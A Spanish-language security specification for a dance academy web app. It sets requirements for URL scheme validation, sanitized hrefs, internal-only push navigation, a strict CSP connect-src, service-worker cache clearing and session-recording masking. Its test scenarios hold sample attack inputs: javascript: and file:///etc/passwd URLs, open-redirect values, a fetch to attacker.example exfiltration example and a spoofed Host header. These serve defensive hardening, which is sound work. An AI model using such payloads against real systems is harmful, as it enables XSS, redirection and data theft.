# web-edge-security Specification

## Purpose
TBD - created by archiving change web-edge-hardening. Update Purpose after archive.

## Requirements

### Requirement: URLs externas validadas en write

Todo campo de URL escrito por un actor que luego se renderiza como
`href` externo SHALL ser una URL absoluta `http:`/`https:` válida. La
API SHALL normalizar (asumiendo `https://` cuando falta esquema) o
rechazar con 400 - nunca persistir esquemas fuera de la whitelist.

Campos cubiertos: `details.url` de métodos `PAYMENT_LINK` (academia y
productor, create y update), `url` de `POST/PATCH /academies/:id/videos`,
`evidenceUrl` de `POST /admin/payouts/:id/pay` y de
`POST /academy-deals/:id/mark-paid`.

#### Scenario: Link de pago con esquema javascript

- WHEN un owner crea un método `PAYMENT_LINK` con
  `details.url = "javascript:alert(1)"`
- THEN la API responde 400 y no persiste el método

#### Scenario: Video con esquema no-http

- WHEN el owner hace `PATCH /academies/:id/videos/:videoId` con
  `url = "file:///etc/passwd"`
- THEN la API responde 400 y el video queda intacto

#### Scenario: Evidencia de payout inválida

- WHEN admin llama `POST /admin/payouts/:id/pay` con
  `evidenceUrl = "javascript:x"`
- THEN la API responde 400 y el payout sigue APPROVED

#### Scenario: URL sin esquema se normaliza

- WHEN un owner guarda `details.url = "mpago.la/abc123"`
- THEN persiste como `https://mpago.la/abc123` (200)

### Requirement: href externo sanitizado en render

Todo anchor a URL provista por actor SHALL pasar por
`safeExternalHref()`: solo `http:`/`https:` absolutas se renderizan
como `href`; cualquier otro valor omite la navegación (sin anchor
clickeable). Aplica a métodos propios, videos, website de academia,
evidencias de pago y menús del venue - incluida data histórica
persistida antes de la validación de write.

#### Scenario: Método PAYMENT_LINK legado con esquema malicioso

- WHEN un método persistido tiene `details.url = "javascript:alert(1)"`
- THEN el checkout muestra el método sin botón de pago externo (el
  anchor no se renderiza)

#### Scenario: Website de academia con esquema no-http

- WHEN `academy.website` es `javascript://host/` (data vieja)
- THEN la ficha no muestra el ícono de sitio web

### Requirement: Click de push con destino interno

El `notificationclick` del service worker SHALL abrir solo paths
internos: empieza con `/`, no con `//`, no con `/\` ni variantes
`%5c`. Cualquier otro valor SHALL caer a `/notificaciones`.

#### Scenario: Payload push con URL externa

- WHEN llega una notificación con `data.url = "https://evil.example"`
- THEN el click abre `/notificaciones`, no el origen externo

#### Scenario: Backslash encoded

- WHEN `data.url` es `/%5cevil.example`
- THEN el click abre `/notificaciones`

### Requirement: `connect-src` sin wildcard

La CSP del documento SHALL restringir `connect-src` a `'self'` más los
orígenes efectivamente usados por scripts de terceros (Tag Manager,
Google Analytics, Clarity) y `NEXT_PUBLIC_API_URL` cuando esté
configurada - sin `https:` ni `wss:` genéricos.

#### Scenario: Exfil a host arbitrario

- WHEN un script en la página intenta `fetch("https://attacker.example")`
- THEN la CSP bloquea la conexión

#### Scenario: Beacons de analytics siguen saliendo

- WHEN GTM/GA4/Clarity emiten sus pings
- THEN llegan a sus orígenes permitidos (no hay regresión de medición)

### Requirement: Caches del SW limpias al cerrar sesión

El logout SHALL borrar el cache de documentos del service worker
(`omnidance-pages-v1`) antes de navegar, para que páginas `/staff/*`
cacheadas no sobrevivan a la sesión.

#### Scenario: Staff sale en compu compartida

- WHEN el staff cierra sesión tras haber visitado `/staff/*` offline
- THEN el cache de páginas queda vacío

### Requirement: `serverApiUrl` sin derivación del request

`serverApiUrl()` SHALL resolver solo por variables de entorno
(`API_URL`, `API_PROXY_TARGET`, `NEXT_PUBLIC_WEB_URL`) y SHALL NOT usar
`Host`/`x-forwarded-host` del request entrante. En producción sin
ninguna env SHALL fallar explícito; en desarrollo cae a
`http://localhost:4000`.

#### Scenario: Request con Host arbitrario en prod

- WHEN llega un request SSR con `Host: attacker.example` y ninguna env
  API configurada
- THEN el servidor lanza error explícito en vez de fetchear hacia el
  host del request

### Requirement: Masking de Clarity en superficies sensibles

Los contenedores que muestran datos bancarios, comprobantes o PII de
identidad SHALL llevar `data-clarity-mask="true"`: detalles de método
propio, panel de pago manual del checkout, fichas de comprobante,
identidad de `/perfil` y `/perfil/datos`, y la ficha de usuario del
admin.

#### Scenario: Grabación de sesión en consola de cobros

- WHEN Clarity graba una sesión en `/academia/cobros/claim/:id` o en el
  checkout manual
- THEN los datos bancarios y notas del pagador aparecen enmascarados

### Requirement: Targets de navegador y SWR de landings

- `apps/web` SHALL declarar `browserslist` con baseline moderno
  (`>0.3%, last 2 versions, not dead`) para recortar polyfills.
- `next.config.mjs` SHALL configurar `expireTime` para que la CDN
  sirva el HTML prerenderizado con `stale-while-revalidate` sin
  alterar el `max-age=0, must-revalidate` que ve el browser.

#### Scenario: Build con browserslist moderno

- WHEN se corre `pnpm --filter @omnidance/web build`
- THEN el bundle sale sin los polyfills de `Array.prototype.at` et al.
  para navegadores fuera del baseline
